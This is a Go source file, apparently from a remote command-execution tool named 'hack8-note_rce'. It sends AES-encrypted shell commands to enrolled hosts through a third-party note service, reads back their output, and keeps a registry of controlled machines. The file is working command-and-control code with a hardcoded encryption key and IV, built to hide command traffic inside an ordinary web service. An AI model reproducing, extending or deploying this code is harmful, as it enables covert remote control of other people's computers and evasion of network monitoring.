package Util

import (
	"encoding/json"
	"fmt"
	"hack8-note_rce/mode"
	"os"
	"time"
)

func Hostexec(noteid, notekey, command string) {

	key := []byte("qaxzaiciyiyouuuu")
	iv := []byte("qaxyydsyydsyydss")
	sh := []byte(notekey + ":" + command)
	//写
	base64, err := AesCbcEncryptBase64(sh, key, iv)
	if err != nil {
		fmt.Println("加密命令错误")
	}
	WriteNote(noteid, base64)
	time.Sleep(2 * time.Second)

	if GetNote(noteid) != base64 {
		byBase64, err := AesCbcDecryptByBase64(GetNote(noteid), key, iv)
		if err != nil {
			fmt.Println("读取结果错误")
		}
		fmt.Println(string(byBase64))
	}
}

// 获取主机
func HostList(admin string) []mode.Host {
	note := GetNote(admin)
	hosts := []mode.Host{}
	err := json.Unmarshal([]byte(note), &hosts)
	if err != nil {
		return nil
	}

	// 使用map去重
	hostMap := make(map[string]mode.Host)
	for _, h := range hosts {
		hostMap[h.HostName] = h
	}

	// 把map中的Host转回切片
	uniqueHosts := make([]mode.Host, 0, len(hostMap))
	for _, h := range hostMap {
		uniqueHosts = append(uniqueHosts, h)
	}
	return uniqueHosts
}

// func RefreshHost(admin string) {
// 	list := HostList(admin)
// 	ii := make(chan int, len(list))
// 	for i := range list {
// 		go VerifHost(list[i].Id, list[i].Notekey, ii, i)
// 	}

// 	var iiii []int
// 	var iii int

// 	for i := 0; i < len(list); i++ {
// 		iii = <-ii
// 		if iii != -1 {
// 			iiii = append(iiii, iii)
// 		}
// 	}
// 	var hostList []mode.Host
// 	for i, _ := range iiii {
// 		hostList = append(hostList, list[iiii[i]])
// 	}
// 	marshal, err := json.Marshal(hostList)
// 	if err != nil {
// 		return
// 	}

// 	WriteNote(admin, string(marshal))

// }

// func VerifHost(id string, notekey string, ii chan int, i int) {
// 	hostexec := Hostexec(id, notekey, "echo test")
// 	if hostexec == "test\n" || hostexec == "test" {
// 		ii <- i
// 	} else {
// 		ii <- -1
// 	}
// }

// 添加主机
func AddHost(admin, notekey, noteid string) {
	host := mode.Host{}
	host.HostName, _ = os.Hostname()
	host.Notekey = notekey
	host.Id = noteid

	list := HostList(admin)
	exists := false
    for _, h := range list {
        if h.Id == host.Id {
            exists = true
            break
        }
    }

    if !exists {
        // 添加新的主机到主机列表中
        var hosts []mode.Host
        if list != nil {
            hosts = list
        } else {
            hosts = []mode.Host{}
        }
        hosts = append(hosts, host)
        marshal, err := json.Marshal(hosts)
        if err != nil {
            return
        }
        WriteNote(admin, string(marshal))
    }
}